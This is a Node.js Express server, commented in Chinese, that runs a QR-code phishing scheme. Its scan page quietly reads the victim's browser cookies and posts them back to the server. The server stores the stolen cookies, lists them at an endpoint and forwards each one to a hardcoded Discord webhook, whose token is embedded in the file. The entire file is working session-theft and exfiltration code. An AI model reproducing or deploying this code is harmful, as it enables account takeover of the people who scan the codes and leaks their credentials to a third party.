const express = require("express");
const { v4: uuidv4 } = require("uuid");
const path = require("path");
const app = express();

app.use(express.json());
app.use(express.static(__dirname));

const WEBHOOK_URL = "https://discord.com/api/webhooks/1494697274121650310/DAbxLzXxdk4EWHyZpeJwVKydfQdQEyul4lOnjE8HAvNouZuwAQP8Sd8w_dLsrxYV6zG1";

const scans = {};
const cookies = [];

// ====== 首页 - 扫码页 ======
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "scan.html"));
});

// ====== Cookie查看页 ======
app.get("/cookies", (req, res) => {
    res.sendFile(path.join(__dirname, "cookies.html"));
});

// ====== 扫码链接 - 用户扫了之后打开的页面 ======
app.get("/s/:scanId", (req, res) => {
    const { scanId } = req.params;
    const scan = scans[scanId];

    if (!scan) {
        return res.send("<h2>二维码已过期或不存在</h2>");
    }

    if (scan.status === "done") {
        return res.send("<h2>该二维码已被使用</h2>");
    }

    res.send(`<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body>
<p>正在获取...</p>
<script>
fetch("/api/submit", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
        scanId: "${scanId}",
        cookie: document.cookie
    })
}).then(function(r) { return r.json(); }).then(function(data) {
    document.body.innerHTML = data.ok ? "<h2>成功</h2>" : "<h2>失败</h2>";
}).catch(function() {
    document.body.innerHTML = "<h2>网络错误</h2>";
});
</script>
</body>
</html>`);
});

// ====== 生成二维码 ======
app.get("/api/qr", (req, res) => {
    const scanId = uuidv4();
    const scanUrl = "https://" + req.get("host") + "/s/" + scanId;

    scans[scanId] = {
        status: "wait",
        cookie: null,
        createdAt: Date.now()
    };

    res.json({ scanId: scanId, scanUrl: scanUrl });
});

// ====== 提交Cookie ======
app.post("/api/submit", (req, res) => {
    const { scanId, cookie } = req.body;
    const scan = scans[scanId];

    if (!scan) {
        return res.status(404).json({ ok: false, error: "not found" });
    }

    if (!cookie || cookie.trim() === "") {
        return res.json({ ok: false, error: "empty cookie" });
    }

    scan.status = "done";
    scan.cookie = cookie;
    cookies.push({ cookie: cookie, time: new Date().toISOString() });

    sendToDiscord(cookie);

    res.json({ ok: true });
});

// ====== 检查扫码状态 ======
app.get("/api/check", (req, res) => {
    const { id } = req.query;
    const scan = scans[id];

    if (!scan) {
        return res.json({ status: "expired", cookie: null });
    }

    res.json({ status: scan.status, cookie: scan.cookie });
});

// ====== 获取所有Cookie ======
app.get("/api/cookies", (req, res) => {
    res.json(cookies.slice(-50).reverse());
});

// ====== 发送到Discord ======
function sendToDiscord(cookie) {
    const https = require("https");
    const url = new URL(WEBHOOK_URL);

    const data = JSON.stringify({
        content: "**新Cookie**\n```\n" + cookie + "\n```"
    });

    const options = {
        hostname: url.hostname,
        path: url.pathname + url.search,
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(data)
        }
    };

    const req = https.request(options);
    req.write(data);
    req.end();
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, function() {
    console.log("运行在端口 " + PORT);
});